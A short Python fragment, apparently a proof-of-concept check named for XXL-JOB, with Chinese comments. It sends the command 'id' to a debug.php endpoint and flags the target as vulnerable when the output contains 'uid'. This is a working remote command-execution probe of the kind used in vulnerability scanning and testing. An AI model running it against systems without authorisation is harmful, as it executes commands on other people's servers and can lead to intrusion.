...
class XXLJOBPOC(POCBase):
    ...
    def _check(self):
        result = []
        # 漏洞验证代码
        # cookies = {"PHPSESSID": "uah1u9up567a50o2al8bihnvn5"}
        '''headers = {
            ...
            "Referer": f"{self.url}debug.php"}'''
        data = {"cmd": "id"}

        try:
            # data = {"cmd": "id"}
            url = f"{self.url}/debug.php?_t=0.9074797655649761"
            res = requests.post(url=url,data=data, verify=False, timeout=9)
            # 判断是否存在漏洞
            if "uid" in res.text:
                result.append(url)
